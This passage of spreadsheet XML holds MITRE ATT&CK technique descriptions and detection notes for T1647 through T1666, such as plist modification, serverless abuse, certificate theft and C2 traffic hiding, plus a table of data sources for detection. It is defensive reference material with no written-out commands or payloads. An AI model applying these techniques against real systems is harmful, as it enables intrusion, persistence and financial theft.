    <t>Debugger related system checks will likely occur in the first steps of an operation but may also occur throughout as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained. Detecting actions related to debugger identification may be difficult depending on the adversary's implementation and monitoring required. Monitoring for suspicious [Native API](https://attack.mitre.org/techniques/T1106) function calls as well as processes being spawned that gather a variety of system information or perform other forms of Discovery, especially in a short period of time, may aid in detection.
Monitor debugger logs for signs of abnormal and potentially malicious activity.</t>
  </si>
  <si>
    <t>T1647</t>
  </si>
  <si>
    <t>Adversaries may modify property list files (plist files) to enable other malicious activity, while also potentially evading and bypassing system defenses. macOS applications use plist files, such as the &lt;code&gt;info.plist&lt;/code&gt; file, to store properties and configuration settings that inform the operating system how to handle the application at runtime. Plist files are structured metadata in key-value pairs formatted in XML based on Apple's Core Foundation DTD. Plist files can be saved in text or binary format.(Citation: fileinfo plist file description) 
Adversaries can modify key-value pairs in plist files to influence system behaviors, such as hiding the execution of an application (i.e. [Hidden Window](https://attack.mitre.org/techniques/T1564/003)) or running additional commands for persistence (ex: [Launch Agent](https://attack.mitre.org/techniques/T1543/001)/[Launch Daemon](https://attack.mitre.org/techniques/T1543/004) or [Re-opened Applications](https://attack.mitre.org/techniques/T1547/007)).
For example, adversaries can add a malicious application path to the `~/Library/Preferences/com.apple.dock.plist` file, which controls apps that appear in the Dock. Adversaries can also modify the &lt;code&gt;LSUIElement&lt;/code&gt; key in an application’s &lt;code&gt;info.plist&lt;/code&gt; file  to run the app in the background. Adversaries can also insert key-value pairs to insert environment variables, such as &lt;code&gt;LSEnvironment&lt;/code&gt;, to enable persistence via [Dynamic Linker Hijacking](https://attack.mitre.org/techniques/T1574/006).(Citation: wardle chp2 persistence)(Citation: eset_osx_flashback)</t>
  </si>
  <si>
    <t xml:space="preserve">Monitor for common command-line editors used to modify plist files located in auto-run locations, such as &lt;code&gt;\~/LaunchAgents&lt;/code&gt;, &lt;code&gt;~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm&lt;/code&gt;, and an application's &lt;code&gt;Info.plist&lt;/code&gt;. 
Monitor for plist file modification immediately followed by code execution from &lt;code&gt;\~/Library/Scripts&lt;/code&gt; and &lt;code&gt;~/Library/Preferences&lt;/code&gt;. Also, monitor for significant changes to any path pointers in a modified plist.
Identify new services executed from plist modified in the previous user's session. </t>
  </si>
  <si>
    <t>T1648</t>
  </si>
  <si>
    <t>Adversaries may abuse serverless computing, integration, and automation services to execute arbitrary code in cloud environments. Many cloud providers offer a variety of serverless resources, including compute engines, application integration services, and web servers. 
Adversaries may abuse these resources in various ways as a means of executing arbitrary commands. For example, adversaries may use serverless functions to execute malicious code, such as crypto-mining malware (i.e. [Resource Hijacking](https://attack.mitre.org/techniques/T1496)).(Citation: Cado Security Denonia) Adversaries may also create functions that enable further compromise of the cloud environment. For example, an adversary may use the `IAM:PassRole` permission in AWS or the `iam.serviceAccounts.actAs` permission in Google Cloud to add [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003) to a serverless cloud function, which may then be able to perform actions the original user cannot.(Citation: Rhino Security Labs AWS Privilege Escalation)(Citation: Rhingo Security Labs GCP Privilege Escalation)
Serverless functions can also be invoked in response to cloud events (i.e. [Event Triggered Execution](https://attack.mitre.org/techniques/T1546)), potentially enabling persistent execution over time. For example, in AWS environments, an adversary may create a Lambda function that automatically adds [Additional Cloud Credentials](https://attack.mitre.org/techniques/T1098/001) to a user and a corresponding CloudWatch events rule that invokes that function whenever a new user is created.(Citation: Backdooring an AWS account) This is also possible in many cloud-based office application suites. For example, in Microsoft 365 environments, an adversary may create a Power Automate workflow that forwards all emails a user receives or creates anonymous sharing links whenever a user is granted access to a document in SharePoint.(Citation: Varonis Power Automate Data Exfiltration)(Citation: Microsoft DART Case Report 001) In Google Workspace environments, they may instead create an Apps Script that exfiltrates a user's data when they open a file.(Citation: Cloud Hack Tricks GWS Apps Script)(Citation: OWN-CERT Google App Script 2024)</t>
  </si>
  <si>
    <t>T1649</t>
  </si>
  <si>
    <t>Active Directory: Active Directory Credential Request, Active Directory: Active Directory Object Modification, Application Log: Application Log Content, Command: Command Execution, File: File Access, Logon Session: Logon Session Creation, Windows Registry: Windows Registry Key Access</t>
  </si>
  <si>
    <t>Adversaries may steal or forge certificates used for authentication to access remote systems or resources. Digital certificates are often used to sign and encrypt messages and/or files. Certificates are also used as authentication material. For example, Entra ID device certificates and Active Directory Certificate Services (AD CS) certificates bind to an identity and can be used as credentials for domain accounts.(Citation: O365 Blog Azure AD Device IDs)(Citation: Microsoft AD CS Overview)
Authentication certificates can be both stolen and forged. For example, AD CS certificates can be stolen from encrypted storage (in the Registry or files)(Citation: APT29 Deep Look at Credential Roaming), misplaced certificate files (i.e. [Unsecured Credentials](https://attack.mitre.org/techniques/T1552)), or directly from the Windows certificate store via various crypto APIs.(Citation: SpecterOps Certified Pre Owned)(Citation: GitHub CertStealer)(Citation: GitHub GhostPack Certificates) With appropriate enrollment rights, users and/or machines within a domain can also request and/or manually renew certificates from enterprise certificate authorities (CA). This enrollment process defines various settings and permissions associated with the certificate. Of note, the certificate’s extended key usage (EKU) values define signing, encryption, and authentication use cases, while the certificate’s subject alternative name (SAN) values define the certificate owner’s alternate names.(Citation: Medium Certified Pre Owned)
Abusing certificates for authentication credentials may enable other behaviors such as [Lateral Movement](https://attack.mitre.org/tactics/TA0008). Certificate-related misconfigurations may also enable opportunities for [Privilege Escalation](https://attack.mitre.org/tactics/TA0004), by way of allowing users to impersonate or assume privileged accounts or permissions via the identities (SANs) associated with a certificate. These abuses may also enable [Persistence](https://attack.mitre.org/tactics/TA0003) via stealing or forging certificates that can be used as [Valid Accounts](https://attack.mitre.org/techniques/T1078) for the duration of the certificate's validity, despite user password resets. Authentication certificates can also be stolen and forged for machine accounts.
Adversaries who have access to root (or subordinate) CA certificate private keys (or mechanisms protecting/managing these keys) may also establish [Persistence](https://attack.mitre.org/tactics/TA0003) by forging arbitrary authentication certificates for the victim domain (known as “golden” certificates).(Citation: Medium Certified Pre Owned) Adversaries may also target certificates and related services in order to access other forms of credentials, such as [Golden Ticket](https://attack.mitre.org/techniques/T1558/001) ticket-granting tickets (TGT) or NTLM plaintext.(Citation: Medium Certified Pre Owned)</t>
  </si>
  <si>
    <t>T1650</t>
  </si>
  <si>
    <t>Adversaries may purchase or otherwise acquire an existing access to a target system or network. A variety of online services and initial access broker networks are available to sell access to previously compromised systems.(Citation: Microsoft Ransomware as a Service)(Citation: CrowdStrike Access Brokers)(Citation: Krebs Access Brokers Fortune 500) In some cases, adversary groups may form partnerships to share compromised systems with each other.(Citation: CISA Karakurt 2022)
Footholds to compromised systems may take a variety of forms, such as access to planted backdoors (e.g., [Web Shell](https://attack.mitre.org/techniques/T1505/003)) or established access via [External Remote Services](https://attack.mitre.org/techniques/T1133). In some cases, access brokers will implant compromised systems with a “load” that can be used to install additional malware for paying customers.(Citation: Microsoft Ransomware as a Service)
By leveraging existing access broker networks rather than developing or obtaining their own initial access capabilities, an adversary can potentially reduce the resources required to gain a foothold on a target network and focus their efforts on later stages of compromise. Adversaries may prioritize acquiring access to systems that have been determined to lack security monitoring or that have high privileges, or systems that belong to organizations in a particular sector.(Citation: Microsoft Ransomware as a Service)(Citation: CrowdStrike Access Brokers)
In some cases, purchasing access to an organization in sectors such as IT contracting, software development, or telecommunications may allow an adversary to compromise additional victims via a [Trusted Relationship](https://attack.mitre.org/techniques/T1199), [Multi-Factor Authentication Interception](https://attack.mitre.org/techniques/T1111), or even [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195).
**Note:** while this technique is distinct from other behaviors such as [Purchase Technical Data](https://attack.mitre.org/techniques/T1597/002) and [Credentials](https://attack.mitre.org/techniques/T1589/001), they may often be used in conjunction (especially where the acquired foothold requires [Valid Accounts](https://attack.mitre.org/techniques/T1078)).</t>
  </si>
  <si>
    <t xml:space="preserve">Much of this takes place outside the visibility of the target organization, making detection difficult for defenders. 
Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access. </t>
  </si>
  <si>
    <t>T1651</t>
  </si>
  <si>
    <t>Adversaries may abuse cloud management services to execute commands within virtual machines. Resources such as AWS Systems Manager, Azure RunCommand, and Runbooks allow users to remotely run scripts in virtual machines by leveraging installed virtual machine agents. (Citation: AWS Systems Manager Run Command)(Citation: Microsoft Run Command)
If an adversary gains administrative access to a cloud environment, they may be able to abuse cloud management services to execute commands in the environment’s virtual machines. Additionally, an adversary that compromises a service provider or delegated administrator account may similarly be able to leverage a [Trusted Relationship](https://attack.mitre.org/techniques/T1199) to execute commands in connected virtual machines.(Citation: MSTIC Nobelium Oct 2021)</t>
  </si>
  <si>
    <t>T1652</t>
  </si>
  <si>
    <t>Adversaries may attempt to enumerate local device drivers on a victim host. Information about device drivers may highlight various insights that shape follow-on behaviors, such as the function/purpose of the host, present security tools (i.e. [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001)) or other defenses (e.g., [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497)), as well as potential exploitable vulnerabilities (e.g., [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)).
Many OS utilities may provide information about local device drivers, such as `driverquery.exe` and the `EnumDeviceDrivers()` API function on Windows.(Citation: Microsoft Driverquery)(Citation: Microsoft EnumDeviceDrivers) Information about device drivers (as well as associated services, i.e., [System Service Discovery](https://attack.mitre.org/techniques/T1007)) may also be available in the Registry.(Citation: Microsoft Registry Drivers)
On Linux/macOS, device drivers (in the form of kernel modules) may be visible within `/dev` or using utilities such as `lsmod` and `modinfo`.(Citation: Linux Kernel Programming)(Citation: lsmod man)(Citation: modinfo man)</t>
  </si>
  <si>
    <t>T1653</t>
  </si>
  <si>
    <t>Adversaries may impair a system's ability to hibernate, reboot, or shut down in order to extend access to infected machines. When a computer enters a dormant state, some or all software and hardware may cease to operate which can disrupt malicious activity.(Citation: Sleep, shut down, hibernate)
Adversaries may abuse system utilities and configuration settings to maintain access by preventing machines from entering a state, such as standby, that can terminate malicious activity.(Citation: Microsoft: Powercfg command-line options)(Citation: systemdsleep Linux)
For example, `powercfg` controls all configurable power system settings on a Windows system and can be abused to prevent an infected host from locking or shutting down.(Citation: Two New Monero Malware Attacks Target Windows and Android Users) Adversaries may also extend system lock screen timeout settings.(Citation: BATLOADER: The Evasive Downloader Malware) Other relevant settings, such as disk and hibernate timeout, can be similarly abused to keep the infected machine running even if no user is active.(Citation: CoinLoader: A Sophisticated Malware Loader Campaign)
Aware that some malware cannot survive system reboots, adversaries may entirely delete files used to invoke system shut down or reboot.(Citation: Condi-Botnet-binaries)</t>
  </si>
  <si>
    <t xml:space="preserve">Command-line invocation of tools capable of modifying services may be unusual and can be monitored for and alerted on, depending on how systems are typically used in a particular environment. 
</t>
  </si>
  <si>
    <t>T1654</t>
  </si>
  <si>
    <t>Adversaries may enumerate system and service logs to find useful data. These logs may highlight various types of valuable insights for an adversary, such as user authentication records ([Account Discovery](https://attack.mitre.org/techniques/T1087)), security or vulnerable software ([Software Discovery](https://attack.mitre.org/techniques/T1518)), or hosts within a compromised network ([Remote System Discovery](https://attack.mitre.org/techniques/T1018)).
Host binaries may be leveraged to collect system logs. Examples include using `wevtutil.exe` or [PowerShell](https://attack.mitre.org/techniques/T1059/001) on Windows to access and/or export security event information.(Citation: WithSecure Lazarus-NoPineapple Threat Intel Report 2023)(Citation: Cadet Blizzard emerges as novel threat actor) In cloud environments, adversaries may leverage utilities such as the Azure VM Agent’s `CollectGuestLogs.exe` to collect security logs from cloud hosted infrastructure.(Citation: SIM Swapping and Abuse of the Microsoft Azure Serial Console)
Adversaries may also target centralized logging infrastructure such as SIEMs. Logs may also be bulk exported and sent to adversary-controlled infrastructure for offline analysis.
In addition to gaining a better understanding of the environment, adversaries may also monitor logs in real time to track incident response procedures. This may allow them to adjust their techniques in order to maintain persistence or evade defenses.(Citation: Permiso GUI-Vil 2023)</t>
  </si>
  <si>
    <t>T1656</t>
  </si>
  <si>
    <t>Adversaries may impersonate a trusted person or organization in order to persuade and trick a target into performing some action on their behalf. For example, adversaries may communicate with victims (via [Phishing for Information](https://attack.mitre.org/techniques/T1598), [Phishing](https://attack.mitre.org/techniques/T1566), or [Internal Spearphishing](https://attack.mitre.org/techniques/T1534)) while impersonating a known sender such as an executive, colleague, or third-party vendor. Established trust can then be leveraged to accomplish an adversary’s ultimate goals, possibly against multiple victims. 
In many cases of business email compromise or email fraud campaigns, adversaries use impersonation to defraud victims -- deceiving them into sending money or divulging information that ultimately enables [Financial Theft](https://attack.mitre.org/techniques/T1657).
Adversaries will often also use social engineering techniques such as manipulative and persuasive language in email subject lines and body text such as `payment`, `request`, or `urgent` to push the victim to act quickly before malicious activity is detected. These campaigns are often specifically targeted against people who, due to job roles and/or accesses, can carry out the adversary’s goal.   
Impersonation is typically preceded by reconnaissance techniques such as [Gather Victim Identity Information](https://attack.mitre.org/techniques/T1589) and [Gather Victim Org Information](https://attack.mitre.org/techniques/T1591) as well as acquiring infrastructure such as email domains (i.e. [Domains](https://attack.mitre.org/techniques/T1583/001)) to substantiate their false identity.(Citation: CrowdStrike-BEC)
There is the potential for multiple victims in campaigns involving impersonation. For example, an adversary may [Compromise Accounts](https://attack.mitre.org/techniques/T1586) targeting one organization which can then be used to support impersonation against other entities.(Citation: VEC)</t>
  </si>
  <si>
    <t>T1657</t>
  </si>
  <si>
    <t>Adversaries may steal monetary resources from targets through extortion, social engineering, technical theft, or other methods aimed at their own financial gain at the expense of the availability of these resources for victims. Financial theft is the ultimate objective of several popular campaign types including extortion by ransomware,(Citation: FBI-ransomware) business email compromise (BEC) and fraud,(Citation: FBI-BEC) "pig butchering,"(Citation: wired-pig butchering) bank hacking,(Citation: DOJ-DPRK Heist) and exploiting cryptocurrency networks.(Citation: BBC-Ronin) 
Adversaries may [Compromise Accounts](https://attack.mitre.org/techniques/T1586) to conduct unauthorized transfers of funds.(Citation: Internet crime report 2022) In the case of business email compromise or email fraud, an adversary may utilize [Impersonation](https://attack.mitre.org/techniques/T1656) of a trusted entity. Once the social engineering is successful, victims can be deceived into sending money to financial accounts controlled by an adversary.(Citation: FBI-BEC) This creates the potential for multiple victims (i.e., compromised accounts as well as the ultimate monetary loss) in incidents involving financial theft.(Citation: VEC)
Extortion by ransomware may occur, for example, when an adversary demands payment from a victim after [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486) (Citation: NYT-Colonial) and [Exfiltration](https://attack.mitre.org/tactics/TA0010) of data, followed by threatening to leak sensitive data to the public unless payment is made to the adversary.(Citation: Mandiant-leaks) Adversaries may use dedicated leak sites to distribute victim data.(Citation: Crowdstrike-leaks)
Due to the potentially immense business impact of financial theft, an adversary may abuse the possibility of financial theft and seeking monetary gain to divert attention from their true goals such as [Data Destruction](https://attack.mitre.org/techniques/T1485) and business disruption.(Citation: AP-NotPetya)</t>
  </si>
  <si>
    <t>T1659</t>
  </si>
  <si>
    <t>Command and Control, Initial Access</t>
  </si>
  <si>
    <t>File: File Creation, Network Traffic: Network Traffic Content, Process: Process Creation</t>
  </si>
  <si>
    <t>Adversaries may gain access and continuously communicate with victims by injecting malicious content into systems through online network traffic. Rather than luring victims to malicious payloads hosted on a compromised website (i.e., [Drive-by Target](https://attack.mitre.org/techniques/T1608/004) followed by [Drive-by Compromise](https://attack.mitre.org/techniques/T1189)), adversaries may initially access victims through compromised data-transfer channels where they can manipulate traffic and/or inject their own content. These compromised online network channels may also be used to deliver additional payloads (i.e., [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) and other data to already compromised systems.(Citation: ESET MoustachedBouncer)
Adversaries may inject content to victim systems in various ways, including:
* From the middle, where the adversary is in-between legitimate online client-server communications (**Note:** this is similar but distinct from [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557), which describes AiTM activity solely within an enterprise environment) (Citation: Kaspersky Encyclopedia MiTM)
* From the side, where malicious content is injected and races to the client as a fake response to requests of a legitimate online server (Citation: Kaspersky ManOnTheSide)
Content injection is often the result of compromised upstream communication channels, for example at the level of an internet service provider (ISP) as is the case with "lawful interception."(Citation: Kaspersky ManOnTheSide)(Citation: ESET MoustachedBouncer)(Citation: EFF China GitHub Attack)</t>
  </si>
  <si>
    <t>T1665</t>
  </si>
  <si>
    <t>Domain Name: Domain Registration, Internet Scan: Response Content, Internet Scan: Response Metadata, Network Traffic: Network Traffic Content</t>
  </si>
  <si>
    <t>Adversaries may manipulate network traffic in order to hide and evade detection of their C2 infrastructure. This can be accomplished in various ways including by identifying and filtering traffic from defensive tools,(Citation: TA571) masking malicious domains to obfuscate the true destination from both automated scanning tools and security researchers,(Citation: Schema-abuse)(Citation: Facad1ng)(Citation: Browser-updates) and otherwise hiding malicious artifacts to delay discovery and prolong the effectiveness of adversary infrastructure that could otherwise be identified, blocked, or taken down entirely.
C2 networks may include the use of [Proxy](https://attack.mitre.org/techniques/T1090) or VPNs to disguise IP addresses, which can allow adversaries to blend in with normal network traffic and bypass conditional access policies or anti-abuse protections. For example, an adversary may use a virtual private cloud to spoof their IP address to closer align with a victim's IP address ranges. This may also bypass security measures relying on geolocation of the source IP address.(Citation: sysdig)(Citation: Orange Residential Proxies)
Adversaries may also attempt to filter network traffic in order to evade defensive tools in numerous ways, including blocking/redirecting common incident responder or security appliance user agents.(Citation: mod_rewrite)(Citation: SocGholish-update) Filtering traffic based on IP and geo-fencing may also avoid automated sandboxing or researcher activity (i.e., [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497)).(Citation: TA571)(Citation: mod_rewrite)
Hiding C2 infrastructure may also be supported by [Resource Development](https://attack.mitre.org/tactics/TA0042) activities such as [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) and [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584). For example, using widely trusted hosting services or domains such as prominent URL shortening providers or marketing services for C2 networks may enable adversaries to present benign content that later redirects victims to malicious web pages or infrastructure once specific conditions are met.(Citation: StarBlizzard)(Citation: QR-cofense)</t>
  </si>
  <si>
    <t>T1666</t>
  </si>
  <si>
    <t>Adversaries may attempt to modify hierarchical structures in infrastructure-as-a-service (IaaS) environments in order to evade defenses.  
IaaS environments often group resources into a hierarchy, enabling improved resource management and application of policies to relevant groups. Hierarchical structures differ among cloud providers. For example, in AWS environments, multiple accounts can be grouped under a single organization, while in Azure environments, multiple subscriptions can be grouped under a single management group.(Citation: AWS Organizations)(Citation: Microsoft Azure Resources)
Adversaries may add, delete, or otherwise modify resource groups within an IaaS hierarchy. For example, in Azure environments, an adversary who has gained access to a Global Administrator account may create new subscriptions in which to deploy resources. They may also engage in subscription hijacking by transferring an existing pay-as-you-go subscription from a victim tenant to an adversary-controlled tenant. This will allow the adversary to use the victim’s compute resources without generating logs on the victim tenant.(Citation: Microsoft Peach Sandstorm 2023)(Citation: Microsoft Subscription Hijacking 2022)
In AWS environments, adversaries with appropriate permissions in a given account may call the `LeaveOrganization` API, causing the account to be severed from the AWS Organization to which it was tied and removing any Service Control Policies, guardrails, or restrictions imposed upon it by its former Organization. Alternatively, adversaries may call the `CreateAccount` API in order to create a new account within an AWS Organization. This account will use the same payment methods registered to the payment account but may not be subject to existing detections or Service Control Policies.(Citation: AWS RE:Inforce Threat Detection 2024)</t>
  </si>
  <si>
    <t>Data Source</t>
  </si>
  <si>
    <t>Available</t>
  </si>
  <si>
    <t>Note</t>
  </si>
  <si>
    <t>collection layers</t>
  </si>
  <si>
    <t>type</t>
  </si>
  <si>
    <t>Active Directory</t>
  </si>
  <si>
    <t>DS0026</t>
  </si>
  <si>
    <t>Cloud Control Plane, Host</t>
  </si>
  <si>
    <t>datasource</t>
  </si>
  <si>
    <t>A database and set of services that allows administrators to manage permissions, access to network resources, and stored data objects (user, group, application, or devices)(Citation: Microsoft AD DS Getting Started)</t>
  </si>
  <si>
    <t>datacomponent</t>
  </si>
  <si>
    <t>A user requested active directory credentials, such as a ticket or token (ex: Windows EID 4769)</t>
  </si>
  <si>
    <t>Active Directory: Active Directory Object Access</t>
  </si>
  <si>
    <t>Opening of an active directory object, typically to collect/read its value (ex: Windows EID 4661)</t>
  </si>
  <si>
    <t>Active Directory: Active Directory Object Creation</t>
  </si>
  <si>
    <t>Initial construction of a new active directory object (ex: Windows EID 5137)</t>
  </si>
  <si>
    <t>Active Directory: Active Directory Object Deletion</t>
  </si>
  <si>
    <t>Removal of an active directory object (ex: Windows EID 5141)</t>
  </si>
  <si>
    <t>Active Directory: Active Directory Object Modification</t>
  </si>
  <si>
    <t>Changes made to an active directory object (ex: Windows EID 5163 or 5136)</t>
  </si>
  <si>
    <t>Application Log</t>
  </si>
  <si>
    <t>DS0015</t>
  </si>
  <si>
    <t>Events collected by third-party services such as mail servers, web applications, or other appliances (not by the native OS or platform)(Citation: Confluence Logs)</t>
  </si>
  <si>
    <t>Logging, messaging, and other artifacts provided by third-party services (ex: metrics, errors, and/or alerts from mail/web applications)</t>
  </si>
  <si>
    <t>Certificate</t>
  </si>
  <si>
    <t>DS0037</t>
  </si>
  <si>
    <t>OSINT</t>
  </si>
  <si>
    <t>A digital document, which highlights information such as the owner's identity, used to instill trust in public keys used while encrypting network communications</t>
  </si>
  <si>
    <t>Certificate: Certificate Registration</t>
  </si>
  <si>
    <t>Queried or logged information highlighting current and expired digital certificates (ex: Certificate transparency)</t>
  </si>
  <si>
    <t>Cloud Service</t>
  </si>
  <si>
    <t>DS0025</t>
  </si>
  <si>
    <t>Cloud Control Plane</t>
  </si>
  <si>
    <t>Infrastructure, platforms, or software that are hosted on-premise or by third-party providers, made available to users through network connections and/or APIs(Citation: Amazon AWS)(Citation: Azure Products)</t>
  </si>
  <si>
    <t>Cloud Service: Cloud Service Disable</t>
  </si>
  <si>
    <t>Deactivation or stoppage of a cloud service (ex: AWS Cloudtrail StopLogging)</t>
  </si>
  <si>
    <t>An extracted list of cloud services (ex: AWS ECS ListServices)</t>
  </si>
  <si>
    <t>Cloud Service: Cloud Service Metadata</t>
  </si>
  <si>
    <t>Contextual data about a cloud service and activity around it such as name, type, or purpose/function</t>
  </si>
  <si>
    <t>Changes made to a cloud service, including its settings and/or data (ex: AWS CloudTrail DeleteTrail or DeleteConfigRule)</t>
  </si>
  <si>
    <t>Cloud Storage</t>
  </si>
  <si>
    <t>DS0010</t>
  </si>
  <si>
    <t>Data object storage infrastructure hosted on-premise or by third-party providers, made available to users through network connections and/or APIs(Citation: Amazon S3)(Citation: Azure Blob Storage)(Citation: Google Cloud Storage)</t>
  </si>
  <si>
    <t>Cloud Storage: Cloud Storage Access</t>
  </si>
  <si>
    <t>Opening of a cloud storage infrastructure, typically to collect/read its value (ex: AWS S3 GetObject)</t>
  </si>
  <si>
    <t>Cloud Storage: Cloud Storage Creation</t>
  </si>
  <si>
    <t>Initial construction of new cloud storage infrastructure (ex: AWS S3 CreateBucket)</t>
  </si>
  <si>
    <t>Cloud Storage: Cloud Storage Deletion</t>
  </si>
  <si>
    <t>Removal of cloud storage infrastructure (ex: AWS S3 DeleteBucket)</t>
  </si>
  <si>
    <t>Cloud Storage: Cloud Storage Enumeration</t>
  </si>
  <si>
    <t>An extracted list of cloud storage infrastructure (ex: AWS S3 ListBuckets or ListObjects)</t>
  </si>
  <si>
    <t>Cloud Storage: Cloud Storage Metadata</t>
  </si>
  <si>
    <t>Contextual data about cloud storage infrastructure and activity around it such as name, size, or owner</t>
  </si>
  <si>
    <t>Changes made to cloud storage infrastructure, including its settings and/or data (ex: AWS S3 PutObject or PutObjectAcl)</t>
  </si>
  <si>
    <t>Command</t>
  </si>
  <si>
    <t>DS0017</t>
  </si>
  <si>
    <t>Container, Host</t>
  </si>
  <si>
    <t>Android, Containers, Linux, Network, Windows, iOS, macOS</t>
  </si>
  <si>
    <t>A directive given to a computer program, acting as an interpreter of some kind, in order to perform a specific task(Citation: Confluence Linux Command  Line)(Citation: Audit OSX)</t>
  </si>
  <si>
    <t>The execution of a line of text, potentially with arguments, created from program code (e.g. a cmdlet executed via powershell.exe, interactive commands like &gt;dir, shell executions, etc. )</t>
  </si>
  <si>
    <t>Container</t>
  </si>
  <si>
    <t>DS0032</t>
  </si>
  <si>
    <t>A standard unit of virtualized software that packages up code and all its dependencies so the application runs quickly and reliably from one computing environment to another(Citation: Docker Docs Container)</t>
  </si>
  <si>
    <t>Container: Container Creation</t>
  </si>
  <si>
    <t>Initial construction of a new container (ex: docker create &lt;container_name&gt;)</t>
  </si>
  <si>
    <t>Container: Container Enumeration</t>
  </si>
  <si>
    <t>An extracted list of containers (ex: docker ps)</t>
  </si>
  <si>
    <t>Container: Container Start</t>
  </si>
  <si>
    <t>Activation or invocation of a container (ex: docker start or docker restart)</t>
  </si>
  <si>
    <t>Domain Name</t>
  </si>
  <si>
    <t>DS0038</t>
  </si>
  <si>
    <t>Information obtained (commonly through registration or activity logs) regarding one or more IP addresses registered with human readable names (ex: mitre.org)</t>
  </si>
  <si>
    <t>Domain Name: Active DNS</t>
  </si>
  <si>
    <t>Queried domain name system (DNS) registry data highlighting current domain to IP address resolutions (ex: dig/nslookup queries)</t>
  </si>
  <si>
    <t>Domain Name: Domain Registration</t>
  </si>
  <si>
    <t>Information about domain name assignments and other domain metadata (ex: WHOIS)</t>
  </si>
  <si>
    <t>Domain Name: Passive DNS</t>
  </si>
  <si>
    <t>Logged domain name system (DNS) data highlighting timelines of domain to IP address resolutions (ex: passive DNS)</t>
  </si>
  <si>
    <t>Domain Name: Threat Feed</t>
  </si>
  <si>
    <t>Sentinel's Threat Feed</t>
  </si>
  <si>
    <t>Drive</t>
  </si>
  <si>
    <t>DS0016</t>
  </si>
  <si>
    <t>Host</t>
  </si>
  <si>
    <t>A non-volatile data storage device (hard drive, floppy disk, USB flash drive) with at least one formatted partition, typically mounted to the file system and/or assigned a drive letter(Citation: Sysmon EID 9)</t>
  </si>
  <si>
    <t>Drive: Drive Access</t>
  </si>
  <si>
    <t>Opening of a data storage device with an assigned drive letter or mount point</t>
  </si>
  <si>
    <t>Drive: Drive Creation</t>
  </si>
  <si>
    <t>Initial construction of a drive letter or mount point to a data storage device</t>
  </si>
  <si>
    <t>Changes made to a drive letter or mount point of a data storage device</t>
  </si>
  <si>
    <t>Driver</t>
  </si>
  <si>
    <t>DS0027</t>
  </si>
  <si>
    <t>A computer program that operates or controls a particular type of device that is attached to a computer. Provides a software interface to hardware devices, enabling operating systems and other computer programs to access hardware functions without needing to know precise details about the hardware being used(Citation: IOKit Fundamentals)(Citation: Windows Getting Started Drivers)</t>
  </si>
  <si>
    <t>Driver: Driver Load</t>
  </si>
  <si>
    <t>Attaching a driver to either user or kernel-mode of a system (ex: Sysmon EID 6)</t>
  </si>
  <si>
    <t>Driver: Driver Metadata</t>
  </si>
  <si>
    <t>Contextual data about a driver and activity around it such as driver issues reporting or integrity (page hash, code) checking</t>
  </si>
  <si>
    <t>File</t>
  </si>
  <si>
    <t>DS0022</t>
  </si>
  <si>
    <t>A computer resource object, managed by the I/O system, for storing data (such as images, text, videos, computer programs, or any wide variety of other media).(Citation: Microsoft File Mgmt)</t>
  </si>
  <si>
    <t>Opening a file, which makes the file contents available to the requestor (ex: Windows EID 4663)</t>
  </si>
  <si>
    <t>Initial construction of a new file (ex: Sysmon EID 11)</t>
  </si>
  <si>
    <t>File: File Deletion</t>
  </si>
  <si>
    <t>Removal of a file (ex: Sysmon EID 23, macOS ESF EID ES_EVENT_TYPE_AUTH_UNLINK, or Linux commands auditd unlink, rename, rmdir, unlinked, or renameat rules)</t>
  </si>
  <si>
    <t>Contextual data about a file, which may include information such as name, the content (ex: signature, headers, or data/media), user/owner, permissions, etc.</t>
  </si>
  <si>
    <t>Changes made to a file, or its access permissions and attributes, typically to alter the contents of the targeted file (ex: Windows EID 4670 or Sysmon EID 2)</t>
  </si>
  <si>
    <t>Firewall</t>
  </si>
  <si>
    <t>DS0018</t>
  </si>
  <si>
    <t>A network security system, running locally on an endpoint or remotely as a service (ex: cloud environment), that monitors and controls incoming/outgoing network traffic based on predefined rules(Citation: AWS Sec Groups VPC)</t>
  </si>
  <si>
    <t>Firewall: Firewall Disable</t>
  </si>
  <si>
    <t>Deactivation or stoppage of a cloud service (ex: Write/Delete entries within Azure Firewall Activity Logs)</t>
  </si>
  <si>
    <t>Firewall: Firewall Enumeration</t>
  </si>
  <si>
    <t>An extracted list of available firewalls and/or their associated settings/rules (ex: Azure Network Firewall CLI Show commands)</t>
  </si>
  <si>
    <t>Firewall: Firewall Metadata</t>
  </si>
  <si>
    <t>Contextual data about a firewall and activity around it such as name, policy, or status</t>
  </si>
  <si>
    <t>Firewall: Firewall Rule Modification</t>
  </si>
  <si>
    <t>Changes made to a firewall rule, typically to allow/block specific network traffic (ex: Windows EID 4950 or Write/Delete entries within Azure Firewall Rule Collection Activity Logs)</t>
  </si>
  <si>
    <t>Firmware</t>
  </si>
  <si>
    <t>DS0001</t>
  </si>
  <si>
    <t>Computer software that provides low-level control for the hardware and device(s) of a host, such as BIOS or UEFI/EFI</t>
  </si>
  <si>
    <t>Changes made to firmware, including its settings and/or data, such as MBR (Master Boot Record) and VBR (Volume Boot Record)</t>
  </si>
  <si>
    <t>Group</t>
  </si>
  <si>
    <t>DS0036</t>
  </si>
  <si>
    <t>A collection of multiple user accounts that share the same access rights to the computer and/or network resources and have common security rights(Citation: Amazon IAM Groups)</t>
  </si>
  <si>
    <t>Group: Group Enumeration</t>
  </si>
  <si>
    <t>An extracted list of available groups and/or their associated settings (ex: AWS list-groups)</t>
  </si>
  <si>
    <t>Group: Group Metadata</t>
  </si>
  <si>
    <t>Contextual data about a group which describes group and activity around it, such as name, permissions, or user accounts within the group</t>
  </si>
  <si>
    <t>Group: Group Modification</t>
  </si>
  <si>
